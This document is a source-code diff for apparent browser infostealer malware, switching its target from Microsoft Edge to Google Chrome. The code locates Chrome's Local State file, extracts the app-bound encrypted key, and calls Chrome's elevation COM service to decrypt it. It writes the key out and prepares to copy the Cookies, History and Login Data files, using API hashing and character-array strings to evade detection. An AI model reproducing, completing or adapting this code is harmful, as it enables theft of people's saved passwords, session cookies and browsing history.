@@ -13,23 +13,18 @@ typedef enum _PROTECTION_LEVEL
 
 } PROTECTION_LEVEL;
 
-typedef struct IElevatorEdge IElevatorEdge;
+typedef struct IElevator IElevator;
 
-typedef struct IElevatorEdgeVtbl
+typedef struct IElevatorVtbl
 {
-    // IUnknown (vtable slots 0-2)
-    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevatorEdge* This, REFIID riid, void** ppvObject);
-    ULONG(STDMETHODCALLTYPE* AddRef)(IElevatorEdge* This);
-    ULONG(STDMETHODCALLTYPE* Release)(IElevatorEdge* This);
+    // IUnknown
+    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevator* This, REFIID riid, void** ppvObject);
+    ULONG(STDMETHODCALLTYPE* AddRef)(IElevator* This);
+    ULONG(STDMETHODCALLTYPE* Release)(IElevator* This);
 
-    // Edge base interface placeholders (vtable slots 3-5)
-    HRESULT(STDMETHODCALLTYPE* _Placeholder1)(IElevatorEdge* This);
-    HRESULT(STDMETHODCALLTYPE* _Placeholder2)(IElevatorEdge* This);
-    HRESULT(STDMETHODCALLTYPE* _Placeholder3)(IElevatorEdge* This);
-
-    // IElevator methods (vtable slots 6-8)
+    // IElevator
     HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
-        IElevatorEdge* This,
+        IElevator* This,
         const WCHAR* crx_path,
         const WCHAR* browser_appid,
         const WCHAR* browser_version,
@@ -39,7 +34,7 @@ typedef struct IElevatorEdgeVtbl
         );
 
     HRESULT(STDMETHODCALLTYPE* EncryptData)(
-        IElevatorEdge* This,
+        IElevator* This,
         PROTECTION_LEVEL    protection_level,
         const BSTR          plaintext,
         BSTR* ciphertext,
@@ -47,17 +42,17 @@ typedef struct IElevatorEdgeVtbl
         );
 
     HRESULT(STDMETHODCALLTYPE* DecryptData)(
-        IElevatorEdge* This,
+        IElevator* This,
         const BSTR      ciphertext,
         BSTR* plaintext,
         DWORD* last_error
         );
 
-} IElevatorEdgeVtbl;
+} IElevatorVtbl;
 
-struct IElevatorEdge
+struct IElevator
 {
-    IElevatorEdgeVtbl* lpVtbl;
+    IElevatorVtbl* lpVtbl;
 };
 
 #define SystemExtendedHandleInformation 64
@@ -195,7 +190,7 @@ bool CreateCopyFile(char* filename, char* newFileName) {
         L'm', L's', L'e', L'd', L'g', L'e',
         L'.', L'e', L'x', L'e',
         L'\0'
-        };
+    };
     size_t count = GetProcessIdsByName(
         processName,
         pids,
@@ -223,11 +218,11 @@ bool CreateCopyFile(char* filename, char* newFileName) {
             FALSE,
             pid
         );
-        
+
         if (!hProc) {
             continue;
         }
-        
+
         ULONG size = 0x10000;
         LPVOID bufferProcessInfo = NULL;
         if (!AllocMemory(size, &bufferProcessInfo)) {
@@ -255,10 +250,10 @@ bool CreateCopyFile(char* filename, char* newFileName) {
             {
                 ULONG newSize = retLen > size ? retLen : size * 2;
                 LPVOID newBuffer = NULL;
-                if (!AllocMemory(newSize, &newBuffer)) { 
+                if (!AllocMemory(newSize, &newBuffer)) {
                     FreeMemory(bufferProcessInfo);
                     pCloseHandle(hProc);
-                    return 0; 
+                    return 0;
                 }
 
                 FreeMemory(bufferProcessInfo);
@@ -434,9 +429,11 @@ bool CreateCopyFile(char* filename, char* newFileName) {
 }
 
 void DecryptKey() {
-    CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
-    IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
-    IElevatorEdge* pElevatorEdge = NULL;
+    CLSID ChromeCLSID = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
+    IID ChromeIID = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
+    IID ChromeIID2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };
+
+    IElevator* pElevator = NULL;
     HRESULT hr;
 
     ApiResolve apiResolve;
@@ -453,7 +450,7 @@ void DecryptKey() {
         return;
     }
 
-    char sOle32[] = {'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0'};
+    char sOle32[] = { 'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0' };
     HMODULE hOle32 = pLoadLibraryA(sOle32);
 
     char sUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' };
@@ -475,12 +472,12 @@ void DecryptKey() {
     if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
         return;
     }
-    
+
     char pathEdge[MAX_PATH] = { 0 };
     CopyStringA(path, pathEdge, MAX_PATH);
     char sSubEdge[] = {
-        '\\','M','i','c','r','o','s','o','f','t','\\',
-        'E','d','g','e','\\',
+        '\\','G','o','o','g','l','e', '\\',
+        'C','h','r','o', 'm', 'e', '\\',
         'U','s','e','r',' ','D','a','t','a', '\\',
         'D', 'e', 'f', 'a', 'u', 'l', 't',
         '\0'
@@ -488,12 +485,12 @@ void DecryptKey() {
     CopyStringA(sSubEdge, pathEdge + StrLen(pathEdge), MAX_PATH - StrLen(pathEdge));
 
     char sLocalState[] = {
-        '\\','M','i','c','r','o','s','o','f','t','\\',
-        'E','d','g','e','\\',
+        '\\','G','o','o','g','l','e', '\\',
+        'C','h','r','o', 'm', 'e', '\\',
         'U','s','e','r',' ','D','a','t','a','\\',
         'L','o','c','a','l',' ','S','t','a','t','e',
         '\0'
-        };
+    };
     int size = StrLen(path);
     CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(path));
 
@@ -519,9 +516,9 @@ void DecryptKey() {
     CopyStringA(pathMal, cookiesPath, MAX_PATH);
     CopyStringA(pathMal, historyPath, MAX_PATH);
     CopyStringA(pathMal, passwordPath, MAX_PATH);
-    char historyFilename[] = {'\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0'};
-    char cookiesFilename[] = {'\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
-    char passwordFilename[] = {'\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };
+    char historyFilename[] = { '\\', 'H', 'i', 's', 't', 'o', 'r', 'y', '\0' };
+    char cookiesFilename[] = { '\\', 'C', 'o', 'o', 'k', 'i', 'e', 's', '\0' };
+    char passwordFilename[] = { '\\', 'L', 'o', 'g', 'i', 'n', ' ', 'D', 'a', 't', 'a', '\0' };
 
     CopyStringA(cookiesFilename, cookiesPath + StrLen(cookiesPath), MAX_PATH - StrLen(cookiesPath));
     CopyStringA(historyFilename, historyPath + StrLen(historyPath), MAX_PATH - StrLen(historyPath));
@@ -574,7 +571,7 @@ void DecryptKey() {
         DWORD        nNumberOfBytesToRead,
         LPDWORD      lpNumberOfBytesRead,
         LPOVERLAPPED lpOverlapped
-    );
+        );
     constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
     _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
     if (!pReadFile) { return; }
@@ -589,7 +586,7 @@ void DecryptKey() {
 
     pCloseHandle(hFile);
 
-    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0'};
+    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0' };
     char* keyPointer = NULL;
     if (!FindPatternA((char*)fileBuf, patternKey, StrLen(patternKey), &keyPointer)) { return; }
     keyPointer = keyPointer + StrLen(patternKey);
@@ -603,10 +600,10 @@ void DecryptKey() {
         sizeKeyB64++;
     }
 
-    typedef HRESULT (WINAPI* _CoInitializeEx)(
+    typedef HRESULT(WINAPI* _CoInitializeEx)(
         LPVOID pvReserved,
         DWORD  dwCoInit
-    );
+        );
 
     constexpr unsigned int hashCoInitializeEx = ComplexHashForAnsi("CoInitializeEx");
     _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(hOle32, hashCoInitializeEx);
@@ -633,12 +630,22 @@ void DecryptKey() {
     _CoCreateInstance pCoCreateInstance = (_CoCreateInstance)apiResolve.GetApiAddress(hOle32, hashCoCreateInstance);
     if (!pCoCreateInstance) { return; }
     hr = pCoCreateInstance(
-        EdgeCLSID,
+        ChromeCLSID,
         nullptr,
         CLSCTX_LOCAL_SERVER,
-        EdgeIID,
-        reinterpret_cast<void**>(&pElevatorEdge)
+        ChromeIID2,
+        reinterpret_cast<void**>(&pElevator)
     );
+
+    if (FAILED(hr)) {
+        hr = pCoCreateInstance(
+            ChromeCLSID,
+            nullptr,
+            CLSCTX_LOCAL_SERVER,
+            ChromeIID,
+            reinterpret_cast<void**>(&pElevator)
+        );
+    }
 
     if (FAILED(hr)) {
         pCoUninitialize();
@@ -660,7 +667,7 @@ void DecryptKey() {
     _CoSetProxyBlanket pCoSetProxyBlanket = (_CoSetProxyBlanket)apiResolve.GetApiAddress(hOle32, hashCoSetProxyBlanket);
     if (!pCoSetProxyBlanket) { return; }
     hr = pCoSetProxyBlanket(
-        (IUnknown*)pElevatorEdge,
+        (IUnknown*)pElevator,
         RPC_C_AUTHN_DEFAULT,
         RPC_C_AUTHZ_DEFAULT,
         COLE_DEFAULT_PRINCIPAL,
@@ -682,7 +689,7 @@ void DecryptKey() {
     constexpr unsigned int hashSysAllocStringByteLen = ComplexHashForAnsi("SysAllocStringByteLen");
     _SysAllocStringByteLen pSysAllocStringByteLen = (_SysAllocStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysAllocStringByteLen);
     if (!pSysAllocStringByteLen) { return; }
-    
+
     typedef UINT(WINAPI* _SysStringByteLen)(BSTR);
     constexpr unsigned int hashSysStringByteLen = ComplexHashForAnsi("SysStringByteLen");
     _SysStringByteLen pSysStringByteLen = (_SysStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysStringByteLen);
@@ -693,7 +700,7 @@ void DecryptKey() {
     _SysFreeString pSysFreeString = (_SysFreeString)apiResolve.GetApiAddress(hOleAut32, hashSysFreeString);
     if (!pSysFreeString) { return; }
     BSTR bstrEncKey = pSysAllocStringByteLen(encKey + 4, length - 4);
-    hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
+    hr = pElevator->lpVtbl->DecryptData(pElevator, bstrEncKey, &decryptedDataBSTR, &dwLastError);
     if (bstrEncKey) {
         pSysFreeString(bstrEncKey);
     }
@@ -719,17 +726,14 @@ void DecryptKey() {
         pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
 
         constexpr unsigned int hashCopyFileA = ComplexHashForAnsi("CopyFileA");
-        typedef BOOL (WINAPI* _CopyFileA)(
+        typedef BOOL(WINAPI* _CopyFileA)(
             LPCSTR lpExistingFileName,
             LPCSTR lpNewFileName,
             BOOL   bFailIfExists
-        );
+            );
         _CopyFileA pCopyFileA = (_CopyFileA)apiResolve.GetApiAddress(lpKernel32, hashCopyFileA);
         if (!pCopyFileA) { return; }
-        
-        //CreateCopyFile(cookiesFilename, cookiesPath);
-        //CreateCopyFile(historyFilename, historyPath);
-        //CreateCopyFile(passwordFilename, passwordPath);
+
         constexpr unsigned int hashSleep = ComplexHashForAnsi("Sleep");
         typedef VOID(WINAPI* _Sleep)(DWORD);
         _Sleep pSleep = (_Sleep)apiResolve.GetApiAddress(lpKernel32, hashSleep);
@@ -749,25 +753,11 @@ void DecryptKey() {
             }
         }
 
-        //if (!pCopyFileA(orCookiesPath, cookiesPath, FALSE)) {
-        //    //CreateCopyFile(cookiesFilename, cookiesPath);
-        //}
-
-        
-        
-        //CreateCopyFile(historyFilename, historyPath);
-        //CreateCopyFile(cookiesFilename, cookiesPath);
-        //CreateCopyFile(passwordFilename, passwordPath);
-
         pSysFreeString(decryptedDataBSTR);
         pCloseHandle(hFile);
     }
 
     FreeMemory(fileBuf);
-    //constexpr unsigned int hashExitThread = ComplexHashForAnsi("ExitThread");
-    //typedef VOID(WINAPI* _ExitThread)(DWORD);
-    //_ExitThread pExitThread = (_ExitThread)apiResolve.GetApiAddress(lpKernel32, hashExitThread);
-    //pExitThread(0);
 }
 
 int main() {
